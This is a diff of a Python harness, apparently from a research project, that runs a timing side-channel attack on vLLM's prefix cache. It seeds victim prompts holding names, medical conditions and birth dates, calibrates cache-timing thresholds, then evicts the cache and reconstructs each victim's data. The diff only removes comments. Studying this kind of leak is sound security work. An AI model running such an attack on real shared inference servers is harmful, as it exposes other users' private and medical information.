@@ -25,7 +25,6 @@ from kv_attack.cache_eviction import evict_cache
 from kv_attack.reconstructor import reconstruct_victim, ReconstructionResult
 
 
-# ── Health check ──────────────────────────────────────────────────────────────
 
 def _health_check(client: OpenAI) -> bool:
     try:
@@ -62,7 +61,6 @@ def _check_apc_enabled() -> bool:
         return True
 
 
-# ── Main attack runner ────────────────────────────────────────────────────────
 
 def run_attack(
     n_victims   : int  = 50,
@@ -83,12 +81,10 @@ def run_attack(
     print(f"[harness] known_dob={known_dob}")
     print("=" * 65 + "\n")
 
-    # ── Phase 0: Health check ─────────────────────────────────────────────────
     if not _health_check(client):
         raise SystemExit("Aborting: vLLM not reachable.")
     _check_apc_enabled()
 
-    # ── Phase 1: Block-aligned system prefix ─────────────────────────────────
     print("\n[harness] PHASE 1 — Building block-aligned system prefix...")
     system_prefix, n_prefix_tokens = build_aligned_system_prompt(
         tokenizer, has_bos=detect_has_bos(MODEL_ID)
@@ -102,7 +98,6 @@ def run_attack(
     assert (1 + n_prefix_tokens) % BLOCK_SIZE == 0, \
         "System prefix not block-aligned."
 
-    # ── Phase 2: Seed victims ─────────────────────────────────────────────────
     print("\n[harness] PHASE 2 — Seeding victims...")
     victim_records = seed_victim_prefix(
         client, tokenizer, system_prefix,
@@ -117,24 +112,9 @@ def run_attack(
         print("[harness] ⚠ WARNING: < 100 private blocks. "
               "Timing gap may be too small on GB10.")
 
-    # ── Phase 3: Calibrate threshold ─────────────────────────────────────────
     print("\n[harness] PHASE 3 — Calibrating timing threshold...")
 
-    # ── Miss prompt factory (critical fix) ───────────────────────────────────
-    # Each call to miss_prompt_factory() returns a UNIQUE prompt that has
-    # never been in the KV cache. We use a UUID hex string as the "name"
-    # field. Since {name} is in the first private block, a different UUID
-    # makes block N (first private block) unique, which cascades via the
-    # SHA-256 hash chain to make ALL 193+ private blocks unique cold misses.
-    #
-    # Without this: vLLM caches the miss prompt after the first measurement.
-    # Measurements 2-N become hits → miss distribution bimodal → std=51ms
-    # → KS test fails. With unique prompts: all N measurements are true
-    # cold misses → std ≈ 2-5 ms → KS test easily passes.
-    #
     def miss_prompt_factory() -> str:
-        # UUID hex[:12] gives 12 fixed hex chars → consistent tokenization
-        # (always tokenises as ~3-4 tokens regardless of content)
         unique_name = f"MISS{uuid.uuid4().hex[:12].upper()}"
         return system_prefix + " " + build_private_block(
             name      = unique_name,
@@ -155,7 +135,6 @@ def run_attack(
     print(f"[harness] Recommended N_REPEATS for 99% SR: "
           f"{calibration['recommended_n_rpts']}")
 
-    # ── Phase 4: Attack each victim ───────────────────────────────────────────
     print(f"\n[harness] PHASE 4 — Attacking {len(victim_records)} victims...")
     results: list[ReconstructionResult] = []
     t_attack_start = time.perf_counter()
@@ -165,10 +144,8 @@ def run_attack(
         print(f"\n[harness] ── Victim {i + 1}/{len(victim_records)} "
               f"(GT: name='{gt['name']}' | cond='{gt['condition']}') ──")
 
-        # (a) Evict entire cache
         evict_cache(client, base_url=VLLM_BASE_URL)
 
-        # (b) Re-seed ONLY this victim
         try:
             client.completions.create(
                 model=MODEL_ID, prompt=record["prompt"],
@@ -178,7 +155,6 @@ def run_attack(
             print(f"[harness] WARNING: re-seed of victim {i} failed: {exc}")
             continue
 
-        # (c) Reconstruct
         result = reconstruct_victim(
             client        = client,
             tokenizer     = tokenizer,
@@ -197,7 +173,6 @@ def run_attack(
 
     total_attack_time = time.perf_counter() - t_attack_start
 
-    # ── Phase 5: Aggregate and write ─────────────────────────────────────────
     if not results:
         raise RuntimeError("No results — all victims failed.")
 
@@ -296,7 +271,6 @@ def run_attack(
     return output
 
 
-# ── CLI ───────────────────────────────────────────────────────────────────────
 
 def main() -> None:
     p = argparse.ArgumentParser(
